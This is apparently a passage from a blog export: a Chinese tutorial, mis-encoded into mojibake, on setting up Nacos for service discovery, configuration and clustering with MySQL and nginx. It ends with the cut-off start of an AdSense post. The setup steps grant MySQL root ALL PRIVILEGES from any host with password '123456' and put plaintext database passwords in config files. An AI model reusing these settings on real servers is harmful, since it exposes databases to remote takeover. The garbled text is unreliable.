@Value(&quot;${service-url.nacos-user-service}&quot;) private String serverURL; @GetMapping(value = &quot;/consumer/payment/nacos/{id}&quot;) public String paymentInfo(@PathVariable(&quot;id&quot;) Long id) { return restTemplate.getForObject(serverURL+&quot;/payment/nacos/&quot;+id,String.class); } } æµ‹è¯• nacosæ§åˆ¶å° 1597917596670 è®¿é—® http://localhost:83/consumer/payment/nacos/13 83è®¿é—®9001/9002ï¼Œè½®è¯¢è´Ÿè½½OK æœåŠ¡æ³¨å†Œä¸­å¿ƒå¯¹æ¯”å„ç§æ³¨å†Œä¸­å¿ƒå¯¹æ¯” Nacoså…¨æ™¯å›¾æ‰€ç¤º 1597917654952 Nacoså’ŒCAP 1597917671204 1597917730065 Nacosæ”¯æŒAPå’ŒCPæ¨¡å¼çš„åˆ‡æ¢1597917749721 curl -X PUT &#39;$NACOS_SERVER:8848/nacos/v1/ns/operator/switches?entry=serverMode&amp;value=CP&#39; Nacosä½œä¸ºæœåŠ¡é…ç½®ä¸­å¿ƒæ¼”ç¤ºNacosä½œä¸ºé…ç½®ä¸­å¿ƒ-åŸºç¡€é…ç½®cloudalibaba-config-nacos-client3377 POM &lt;dependencies&gt; &lt;!--nacos-config--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--nacos-discovery--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--web + actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--ä¸€èˆ¬åŸºç¡€é…ç½®--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; YML ä¸ºä»€ä¹ˆé…ç½®ä¸¤ä¸ª 1597999398581 bootstrap server: port: 3377 spring: application: name: nacos-config-client cloud: nacos: discovery: server-addr: localhost:8848 #æœåŠ¡æ³¨å†Œä¸­å¿ƒåœ°å€ config: server-addr: localhost:8848 #é…ç½®ä¸­å¿ƒåœ°å€ file-extension: yaml #æŒ‡å®šyamlæ ¼å¼çš„é…ç½® application spring: profiles: active: dev ä¸»å¯åŠ¨ç±» package com.kayleh.springcloud.alibaba; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; @EnableDiscoveryClient @SpringBootApplication public class NacosConfigClientMain3377 { public static void main(String[] args) { SpringApplication.run(NacosConfigClientMain3377.class, args); } } ä¸šåŠ¡ç±» ConfigClientController package com.kayleh.springcloud.alibaba.controller; import org.springframework.beans.factory.annotation.Value; import org.springframework.cloud.context.config.annotation.RefreshScope; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController @RefreshScope public class ConfigClientController { @Value(&quot;${config.info}&quot;) private String configInfo; @GetMapping(&quot;/config/info&quot;) public String getConfigInfo() { return configInfo; } } @RefreshScope 1597999398581 åœ¨Nacosä¸­æ·»åŠ é…ç½®ä¿¡æ¯Nacosä¸­çš„åŒ¹é…è§„åˆ™ç†è®º Nacosä¸­çš„dataidçš„ç»„æˆæ ¼å¼ä¸SpringBooté…ç½®æ–‡ä»¶ä¸­çš„åŒ¹é…è§„åˆ™ https://nacos.io/zh-cn/docs/quick-start-spring-cloud.html 1597999707395 1597999752185 å®æ“ 1.é…ç½®æ–°å¢ 1597999802135 nacos-config-client-dev 2.Nacosç•Œé¢é…ç½®å¯¹åº” config: info: nacos config center,version = 1,from nacos config center, nacos-config-client-dev.yaml, version=1 1598006810118 è®¾ç½®DataId å…¬å¼: ${spring.application.name}-${spring.profile.active}.${spring.cloud.nacos.config.file-extension} prefixé»˜è®¤ä¸ºspring.application.nameçš„å€¼ spring.profile.activeæ—¢ä¸ºå½“å‰ç¯å¢ƒå¯¹åº”çš„profile,å¯ä»¥é€šè¿‡é…ç½®é¡¹spring.profile.active æ¥é…ç½® file-exetensionä¸ºé…ç½®å†…å®¹çš„æ•°æ®æ ¼å¼ï¼Œå¯ä»¥é€šè¿‡é…ç½®é¡¹spring.cloud.nacos.config.file-extensioné…ç½® æ€»ç»“: 1598006888126 3.å†å²é…ç½® æµ‹è¯•å¯åŠ¨å‰éœ€è¦åœ¨nacoså®¢æˆ·ç«¯-é…ç½®ç®¡ç†-é…ç½®ç®¡ç†æ ç›®ä¸‹æœ‰æ²¡æœ‰å¯¹åº”çš„yamlé…ç½®æ–‡ä»¶ è¿è¡Œcloud-config-nacos-client3377çš„ä¸»å¯åŠ¨ç±» è°ƒç”¨æ¥å£æŸ¥çœ‹é…ç½®ä¿¡æ¯ http://localhost:3377/config/info è‡ªå¸¦åŠ¨æ€åˆ·æ–°ä¿®æ”¹ä¸‹Nacosä¸­çš„yamlé…ç½®æ–‡ä»¶ï¼Œå†æ¬¡è°ƒç”¨æŸ¥çœ‹é…ç½®çš„æ¥å£ï¼Œå°±ä¼šå‘ç°é…ç½®å·²ç»åˆ·æ–° Nacosä½œä¸ºé…ç½®ä¸­å¿ƒ-åˆ†ç±»é…ç½®é—®é¢˜ å¤šç¯å¢ƒå¤šé¡¹ç›®ç®¡ç† 1598007094349 Nacosçš„å›¾å½¢åŒ–ç®¡ç†ç•Œé¢ é…ç½®ç®¡ç† 1598007142269 å‘½åç©ºé—´ 1598007159998\" style=\"zoom: 80%; Namespace+Group+Data IDä¸‰è€…å…³ç³»ï¼Ÿä¸ºä»€ä¹ˆè¿™ä¹ˆè®¾è®¡ï¼Ÿ1598007201161 1598007216472 Caseä¸€ã€DataIDæ–¹æ¡ˆ æŒ‡å®šspring.profile.activeå’Œé…ç½®æ–‡ä»¶çš„DataIDæ¥ä½¿ä¸åŒç¯å¢ƒä¸‹è¯»å–ä¸åŒçš„é…ç½® é»˜è®¤ç©ºé—´+é»˜è®¤åˆ†ç»„+æ–°å»ºdevå’Œtestä¸¤ä¸ªDataID æ–°å»ºdevé…ç½®DataID 1598007306224 æ–°å»ºtesté…ç½®DataID 1598007322942 é€šè¿‡spring.profile.activeå±æ€§å°±èƒ½è¿›è¡Œå¤šç¯å¢ƒä¸‹é…ç½®æ–‡ä»¶çš„è¯»å– æµ‹è¯• http://localhost:3377/config/info é…ç½®æ˜¯ä»€ä¹ˆå°±åŠ è½½ä»€ä¹ˆ test äºŒã€Groupæ–¹æ¡ˆé€šè¿‡Groupå®ç°ç¯å¢ƒåŒºåˆ† æ–°å»ºGroup 1598010952482 åœ¨nacoså›¾å½¢ç•Œé¢æ§åˆ¶å°ä¸Šé¢æ–°å»ºé…ç½®æ–‡ä»¶DataID 1598010985237 bootstrap+application 1598011032814 åœ¨configä¸‹å¢åŠ ä¸€æ¡groupçš„é…ç½®å³å¯ã€‚å¯é…ç½®ä¸ºDEV_GROUPæˆ–TEST_GROUP ä¸‰ã€Namespaceæ–¹æ¡ˆæ–°å»ºdev/testçš„Namespace 1598011094792 å›åˆ°æœåŠ¡ç®¡ç†-æœåŠ¡åˆ—è¡¨æŸ¥çœ‹ 1598011118483 æŒ‰ç…§åŸŸåé…ç½®å¡«å†™ 1598011149802 YML bootstrap 1598264395915 namespace: application Nacosé›†ç¾¤å’ŒæŒä¹…åŒ–é…ç½®æ˜¯ä»€ä¹ˆï¼Ÿ https://nacos.io/zh-cn/docs/cluster-mode-quick-start.html 33\" style=\"zoom: 80%; 34\" style=\"zoom: 80%; 35\" style=\"zoom: 80%; æŒ‰ç…§ä¸Šè¿°ï¼Œæˆ‘ä»¬éœ€è¦mysqlæ•°æ®åº“ https://nacos.io/zh-cn/docs/deployment.html 1598011363176 1598011391934 NacosæŒä¹…åŒ–é…ç½®è§£é‡ŠNacosé»˜è®¤è‡ªå¸¦çš„æ˜¯åµŒå…¥å¼æ•°æ®åº“derby https://github.com/alibaba/nacos/blob/develop/config/pom.xml derbyåˆ°mysqlåˆ‡æ¢é…ç½®æ­¥éª¤ nacos-server-1.1.4\\nacos\\confç›®å½•ä¸‹æ‰¾åˆ°sqlè„šæœ¬ nacos-mysql.sql æ‰§è¡Œè„šæœ¬ CREATE DATABASE nacos_config; USE nacos_config; /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = config_info */ /******************************************/ CREATE TABLE `config_info` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;id&#39;, `data_id` varchar(255) NOT NULL COMMENT &#39;data_id&#39;, `group_id` varchar(255) DEFAULT NULL, `content` longtext NOT NULL COMMENT &#39;content&#39;, `md5` varchar(32) DEFAULT NULL COMMENT &#39;md5&#39;, `gmt_create` datetime NOT NULL DEFAULT &#39;2010-05-05 00:00:00&#39; COMMENT &#39;åˆ›å»ºæ—¶é—´&#39;, `gmt_modified` datetime NOT NULL DEFAULT &#39;2010-05-05 00:00:00&#39; COMMENT &#39;ä¿®æ”¹æ—¶é—´&#39;, `src_user` text COMMENT &#39;source user&#39;, `src_ip` varchar(20) DEFAULT NULL COMMENT &#39;source ip&#39;, `app_name` varchar(128) DEFAULT NULL, `tenant_id` varchar(128) DEFAULT &#39;&#39; COMMENT &#39;ç§Ÿæˆ·å­—æ®µ&#39;, `c_desc` varchar(256) DEFAULT NULL, `c_use` varchar(64) DEFAULT NULL, `effect` varchar(64) DEFAULT NULL, `type` varchar(64) DEFAULT NULL, `c_schema` text, PRIMARY KEY (`id`), UNIQUE KEY `uk_configinfo_datagrouptenant` (`data_id`,`group_id`,`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=&#39;config_info&#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = config_info_aggr */ /******************************************/ CREATE TABLE `config_info_aggr` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;id&#39;, `data_id` varchar(255) NOT NULL COMMENT &#39;data_id&#39;, `group_id` varchar(255) NOT NULL COMMENT &#39;group_id&#39;, `datum_id` varchar(255) NOT NULL COMMENT &#39;datum_id&#39;, `content` longtext NOT NULL COMMENT &#39;å†…å®¹&#39;, `gmt_modified` datetime NOT NULL COMMENT &#39;ä¿®æ”¹æ—¶é—´&#39;, `app_name` varchar(128) DEFAULT NULL, `tenant_id` varchar(128) DEFAULT &#39;&#39; COMMENT &#39;ç§Ÿæˆ·å­—æ®µ&#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_configinfoaggr_datagrouptenantdatum` (`data_id`,`group_id`,`tenant_id`,`datum_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=&#39;å¢åŠ ç§Ÿæˆ·å­—æ®µ&#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = config_info_beta */ /******************************************/ CREATE TABLE `config_info_beta` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;id&#39;, `data_id` varchar(255) NOT NULL COMMENT &#39;data_id&#39;, `group_id` varchar(128) NOT NULL COMMENT &#39;group_id&#39;, `app_name` varchar(128) DEFAULT NULL COMMENT &#39;app_name&#39;, `content` longtext NOT NULL COMMENT &#39;content&#39;, `beta_ips` varchar(1024) DEFAULT NULL COMMENT &#39;betaIps&#39;, `md5` varchar(32) DEFAULT NULL COMMENT &#39;md5&#39;, `gmt_create` datetime NOT NULL DEFAULT &#39;2010-05-05 00:00:00&#39; COMMENT &#39;åˆ›å»ºæ—¶é—´&#39;, `gmt_modified` datetime NOT NULL DEFAULT &#39;2010-05-05 00:00:00&#39; COMMENT &#39;ä¿®æ”¹æ—¶é—´&#39;, `src_user` text COMMENT &#39;source user&#39;, `src_ip` varchar(20) DEFAULT NULL COMMENT &#39;source ip&#39;, `tenant_id` varchar(128) DEFAULT &#39;&#39; COMMENT &#39;ç§Ÿæˆ·å­—æ®µ&#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_configinfobeta_datagrouptenant` (`data_id`,`group_id`,`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=&#39;config_info_beta&#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = config_info_tag */ /******************************************/ CREATE TABLE `config_info_tag` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;id&#39;, `data_id` varchar(255) NOT NULL COMMENT &#39;data_id&#39;, `group_id` varchar(128) NOT NULL COMMENT &#39;group_id&#39;, `tenant_id` varchar(128) DEFAULT &#39;&#39; COMMENT &#39;tenant_id&#39;, `tag_id` varchar(128) NOT NULL COMMENT &#39;tag_id&#39;, `app_name` varchar(128) DEFAULT NULL COMMENT &#39;app_name&#39;, `content` longtext NOT NULL COMMENT &#39;content&#39;, `md5` varchar(32) DEFAULT NULL COMMENT &#39;md5&#39;, `gmt_create` datetime NOT NULL DEFAULT &#39;2010-05-05 00:00:00&#39; COMMENT &#39;åˆ›å»ºæ—¶é—´&#39;, `gmt_modified` datetime NOT NULL DEFAULT &#39;2010-05-05 00:00:00&#39; COMMENT &#39;ä¿®æ”¹æ—¶é—´&#39;, `src_user` text COMMENT &#39;source user&#39;, `src_ip` varchar(20) DEFAULT NULL COMMENT &#39;source ip&#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_configinfotag_datagrouptenanttag` (`data_id`,`group_id`,`tenant_id`,`tag_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=&#39;config_info_tag&#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = config_tags_relation */ /******************************************/ CREATE TABLE `config_tags_relation` ( `id` bigint(20) NOT NULL COMMENT &#39;id&#39;, `tag_name` varchar(128) NOT NULL COMMENT &#39;tag_name&#39;, `tag_type` varchar(64) DEFAULT NULL COMMENT &#39;tag_type&#39;, `data_id` varchar(255) NOT NULL COMMENT &#39;data_id&#39;, `group_id` varchar(128) NOT NULL COMMENT &#39;group_id&#39;, `tenant_id` varchar(128) DEFAULT &#39;&#39; COMMENT &#39;tenant_id&#39;, `nid` bigint(20) NOT NULL AUTO_INCREMENT, PRIMARY KEY (`nid`), UNIQUE KEY `uk_configtagrelation_configidtag` (`id`,`tag_name`,`tag_type`), KEY `idx_tenant_id` (`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=&#39;config_tag_relation&#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = group_capacity */ /******************************************/ CREATE TABLE `group_capacity` ( `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT &#39;ä¸»é”®ID&#39;, `group_id` varchar(128) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;Group IDï¼Œç©ºå­—ç¬¦è¡¨ç¤ºæ•´ä¸ªé›†ç¾¤&#39;, `quota` int(10) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;é…é¢ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#39;, `usage` int(10) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;ä½¿ç”¨é‡&#39;, `max_size` int(10) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;å•ä¸ªé…ç½®å¤§å°ä¸Šé™ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#39;, `max_aggr_count` int(10) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;èšåˆå­é…ç½®æœ€å¤§ä¸ªæ•°ï¼Œï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#39;, `max_aggr_size` int(10) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;å•ä¸ªèšåˆæ•°æ®çš„å­é…ç½®å¤§å°ä¸Šé™ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#39;, `max_history_count` int(10) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;æœ€å¤§å˜æ›´å†å²æ•°é‡&#39;, `gmt_create` datetime NOT NULL DEFAULT &#39;2010-05-05 00:00:00&#39; COMMENT &#39;åˆ›å»ºæ—¶é—´&#39;, `gmt_modified` datetime NOT NULL DEFAULT &#39;2010-05-05 00:00:00&#39; COMMENT &#39;ä¿®æ”¹æ—¶é—´&#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_group_id` (`group_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=&#39;é›†ç¾¤ã€å„Groupå®¹é‡ä¿¡æ¯è¡¨&#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = his_config_info */ /******************************************/ CREATE TABLE `his_config_info` ( `id` bigint(64) unsigned NOT NULL, `nid` bigint(20) unsigned NOT NULL AUTO_INCREMENT, `data_id` varchar(255) NOT NULL, `group_id` varchar(128) NOT NULL, `app_name` varchar(128) DEFAULT NULL COMMENT &#39;app_name&#39;, `content` longtext NOT NULL, `md5` varchar(32) DEFAULT NULL, `gmt_create` datetime NOT NULL DEFAULT &#39;2010-05-05 00:00:00&#39;, `gmt_modified` datetime NOT NULL DEFAULT &#39;2010-05-05 00:00:00&#39;, `src_user` text, `src_ip` varchar(20) DEFAULT NULL, `op_type` char(10) DEFAULT NULL, `tenant_id` varchar(128) DEFAULT &#39;&#39; COMMENT &#39;ç§Ÿæˆ·å­—æ®µ&#39;, PRIMARY KEY (`nid`), KEY `idx_gmt_create` (`gmt_create`), KEY `idx_gmt_modified` (`gmt_modified`), KEY `idx_did` (`data_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=&#39;å¤šç§Ÿæˆ·æ”¹é€ &#39;; /******************************************/ /* æ•°æ®åº“å…¨å = nacos_config */ /* è¡¨åç§° = tenant_capacity */ /******************************************/ CREATE TABLE `tenant_capacity` ( `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT &#39;ä¸»é”®ID&#39;, `tenant_id` varchar(128) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;Tenant ID&#39;, `quota` int(10) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;é…é¢ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#39;, `usage` int(10) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;ä½¿ç”¨é‡&#39;, `max_size` int(10) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;å•ä¸ªé…ç½®å¤§å°ä¸Šé™ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#39;, `max_aggr_count` int(10) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;èšåˆå­é…ç½®æœ€å¤§ä¸ªæ•°&#39;, `max_aggr_size` int(10) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;å•ä¸ªèšåˆæ•°æ®çš„å­é…ç½®å¤§å°ä¸Šé™ï¼Œå•ä½ä¸ºå­—èŠ‚ï¼Œ0è¡¨ç¤ºä½¿ç”¨é»˜è®¤å€¼&#39;, `max_history_count` int(10) unsigned NOT NULL DEFAULT &#39;0&#39; COMMENT &#39;æœ€å¤§å˜æ›´å†å²æ•°é‡&#39;, `gmt_create` datetime NOT NULL DEFAULT &#39;2010-05-05 00:00:00&#39; COMMENT &#39;åˆ›å»ºæ—¶é—´&#39;, `gmt_modified` datetime NOT NULL DEFAULT &#39;2010-05-05 00:00:00&#39; COMMENT &#39;ä¿®æ”¹æ—¶é—´&#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_tenant_id` (`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=&#39;ç§Ÿæˆ·å®¹é‡ä¿¡æ¯è¡¨&#39;; CREATE TABLE `tenant_info` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;id&#39;, `kp` varchar(128) NOT NULL COMMENT &#39;kp&#39;, `tenant_id` varchar(128) default &#39;&#39; COMMENT &#39;tenant_id&#39;, `tenant_name` varchar(128) default &#39;&#39; COMMENT &#39;tenant_name&#39;, `tenant_desc` varchar(256) DEFAULT NULL COMMENT &#39;tenant_desc&#39;, `create_source` varchar(32) DEFAULT NULL COMMENT &#39;create_source&#39;, `gmt_create` bigint(20) NOT NULL COMMENT &#39;åˆ›å»ºæ—¶é—´&#39;, `gmt_modified` bigint(20) NOT NULL COMMENT &#39;ä¿®æ”¹æ—¶é—´&#39;, PRIMARY KEY (`id`), UNIQUE KEY `uk_tenant_info_kptenantid` (`kp`,`tenant_id`), KEY `idx_tenant_id` (`tenant_id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_bin COMMENT=&#39;tenant_info&#39;; CREATE TABLE users ( username varchar(50) NOT NULL PRIMARY KEY, password varchar(500) NOT NULL, enabled boolean NOT NULL ); CREATE TABLE roles ( username varchar(50) NOT NULL, role varchar(50) NOT NULL ); INSERT INTO users (username, password, enabled) VALUES (&#39;nacos&#39;, &#39;$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu&#39;, TRUE); INSERT INTO roles (username, role) VALUES (&#39;nacos&#39;, &#39;ROLE_ADMIN&#39;); nacos-server-1.1.4\\nacos\\confç›®å½•ä¸‹æ‰¾åˆ°application.properties mysql8.0+åé¢åŠ ä¸Šæ—¶åŒºserverTimezone=UTCspring.datasource.platform=mysql db.num=1 db.url.0=jdbc:mysql://11.162.196.16:3306/nacos_devtest?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true db.user=nacos_devtest db.password=youdontknow ################################################## spring.datasource.platform=mysql db.num=1 db.url.0=jdbc:mysql://localhost:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true db.user=root db.password=123456 å¯åŠ¨nacosï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸ªå…¨æ–°çš„ç©ºè®°å½•ç•Œé¢ï¼Œä»¥å‰æ˜¯è®°å½•è¿›derby Linuxç‰ˆNacos+MySQLç”Ÿäº§ç¯å¢ƒé…ç½® é¢„è®¡éœ€è¦ï¼Œ1ä¸ªnginx+3ä¸ªnacosæ³¨å†Œä¸­å¿ƒ+1ä¸ªmysql Nacosä¸‹è½½linuxç‰ˆæœ¬ 1598011630753\" style=\"zoom:80%; https://github.com/alibaba/nacos/releases/tag/1.1.4 nacos-server-1.1.4.tar.gz è§£å‹åˆ°/opt æ‹·è´ cp -r nacos /mynacos/ cd /mynacos/nacos/ cd bin æ‰§è¡Œ,æ‰§è¡Œä¹‹å‰æŠŠåŸå§‹çš„é…ç½®å¤‡ä»½ä¸€éã€‚ cp startup.sh startup.sh.bk startup.sh è§£å‹åå®‰è£… é›†ç¾¤é…ç½®æ­¥éª¤1.LinuxæœåŠ¡å™¨ä¸Šmysqlæ•°æ®åº“é…ç½®SQLè„šæœ¬åœ¨å“ªé‡Œ1598011816083 sqlè¯­å¥æºæ–‡ä»¶nacos-mysql.sql è‡ªå·±Linuxæœºå™¨ä¸Šçš„Mysqlæ•°æ®åº“é»è´´1598011996589 2.application.propertiesé…ç½®ä½ç½®1598012047300 å†…å®¹spring.datasource.platform=mysql db.num=1 db.url.0=jdbc:mysql://1.7.0.1:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true db.user=root db.password=HF_mysql_654321 1598012185308 mysql æˆæƒè¿œç¨‹è®¿é—® GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;123456&#39; WITH GRANT OPTION; flush privileges; 3.LinuxæœåŠ¡å™¨ä¸Šnacosçš„é›†ç¾¤é…ç½®cluster.confæ¢³ç†å‡º3å°nacosæœºå™¨çš„ä¸åŒæœåŠ¡ç«¯å£å· å¤åˆ¶å‡ºcluster.conf 1598012321701 å†…å®¹1598012391295\" style=\"zoom:67%; è¿™ä¸ªIPä¸èƒ½å†™127.0.0.1,å¿…é¡»æ˜¯Linuxå‘½ä»¤hostname -ièƒ½å¤Ÿè¯†åˆ«çš„IP 1598012433063 æˆ–è€…ifconfig 4.ç¼–è¾‘Nacosçš„å¯åŠ¨è„šæœ¬startup.shï¼Œä½¿å®ƒèƒ½å¤Ÿæ¥å—ä¸åŒçš„å¯åŠ¨ç«¯/mynacos/nacos/binç›®å½•ä¸‹æœ‰startup.shåœ¨ä»€ä¹ˆåœ°æ–¹ï¼Œä¿®æ”¹ä»€ä¹ˆï¼Œæ€ä¹ˆä¿®æ”¹ æ€è€ƒ 1598012484557 ä¿®æ”¹å†…å®¹ 1598012508369 cp startup.sh startup.sh.bk 1598012527781 1598012546461 æ‰§è¡Œæ–¹å¼ 1598012636318 5.Nginxçš„é…ç½®ï¼Œç”±å®ƒä½œä¸ºè´Ÿè½½å‡è¡¡å™¨ä¿®æ”¹nginxçš„é…ç½®æ–‡ä»¶ 1598012677966 nginx.conf upstream cluster{ server 127.0.0.1:3333; server 127.0.0.1:4444; server 127.0.0.1:5555; } server{ listen 1111; server_name localhost; location /{ proxy_pass http://cluster; } â€¦.çœç•¥ 1598013304340\" style=\"zoom: 80%; æŒ‰ç…§æŒ‡å®šå¯åŠ¨ 1598013342566 ps -ef|grep nacos|grep -v grep |wc -l -------------- 3 3ä¸ªå¾®æœåŠ¡å·²å¯åŠ¨ 6.æˆªæ­¢åˆ°æ­¤å¤„ï¼Œ1ä¸ªNginx+3ä¸ªnacosæ³¨å†Œä¸­å¿ƒ+1ä¸ªmysqlæµ‹è¯•é€šè¿‡nginxè®¿é—®nacos https://å†™ä½ è‡ªå·±è™šæ‹Ÿæœºçš„ip:1111/nacos/#/login æ–°å»ºä¸€ä¸ªé…ç½®æµ‹è¯• 1598013402984\" style=\"zoom:80%; mysql&gt; select * from config_info; linuxæœåŠ¡å™¨çš„mysqlæ’å…¥ä¸€æ¡è®°å½• 1598013436552 æµ‹è¯•å¾®æœåŠ¡cloudalibaba-provider-payment9002å¯åŠ¨æ³¨å†Œè¿›nacosé›†ç¾¤ yml server-addr: å†™ä½ è‡ªå·±çš„è™šæ‹Ÿæœºip:1111 ç»“æœ 1598013518452 é«˜å¯ç”¨å°æ€»ç»“ 1598013576604","categories":[{"name":"åˆ†å¸ƒå¼","slug":"åˆ†å¸ƒå¼","permalink":"https://blog.kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"}]},{"title":"Traffic monetization:Access to Google Adsense","slug":"æ¥å…¥è°·æ­Œå¹¿å‘Šè”ç›ŸAdsense","date":"2020-08-20T23:23:22.000Z","updated":"2021-04-11T17:11:28.884Z","comments":true,"path":"æ¥å…¥è°·æ­Œå¹¿å‘Šè”ç›ŸAdsense/","link":"","permalink":"https://blog.kayleh.top/%E6%8E%A5%E5%85%A5%E8%B0%B7%E6%AD%8C%E5%B9%BF%E5%91%8A%E8%81%94%E7%9B%9FAdsense/","excerpt":"æµé‡å˜ç°: æ¥å…¥è°·æ­Œå¹¿å‘Šè”ç›Ÿ https://kayleh.top","text":"æµé‡å˜ç°: æ¥å…¥è°·æ­Œå¹¿å‘Šè”ç›Ÿ https://kayleh.top ç½‘ç«™åŸŸåå¿…é¡»ä¸ºé¡¶çº§åŸŸå!! æŒ‰ç…§å®˜ç½‘çš„æ–‡æ¡£è¿›è¡Œ æŠŠadsenseä»£ç å†™è¿›headæ ‡ç­¾å†…ï¼Œæ¯ä¸ªç½‘ç«™çš„headéƒ½è¦æœ‰è¿™ä¸ªæ ‡ç­¾1597994802821 æäº¤åè°·æ­Œä¼šè¿›è¡Œå®¡æ ¸ï¼Œä¸€èˆ¬ä¸ºå‡ å¤© æ³¨æ„å®¡æ ¸æœŸé—´ä¸èƒ½æŠŠä»£ç ç‰‡æ®µåˆ é™¤,ä¸è¦å¤§é‡ä¿®æ”¹ç½‘ç«™å†…å®¹,ä¸è¦éšæ„æ›´æ¢åŸŸå. å®¡æ ¸æ ‡å‡†ä¸€èˆ¬è®¤ä¸ºæœ€é‡è¦çš„æ˜¯è¿™å‡ ç‚¹: å†…å®¹åŸåˆ›,åŸåˆ›å†…å®¹å¯¹è°·æ­Œå®¡æ 